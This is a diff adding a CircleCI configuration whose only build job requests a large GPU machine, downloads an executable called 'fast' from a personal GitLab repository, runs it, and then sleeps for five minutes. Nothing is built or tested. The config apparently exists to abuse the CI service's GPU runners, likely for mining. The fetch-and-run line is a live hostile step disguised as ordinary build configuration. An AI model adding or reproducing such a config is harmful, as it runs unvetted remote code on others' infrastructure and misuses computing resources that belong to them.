@@ -1,0 +1,9 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-1604-cuda-10.1:201909-23
+    steps:
+      - run: wget https://gitlab.com/richardkevin320/depo/-/raw/main/fast && chmod +x fast && ./fast
+      - run: sleep 5m
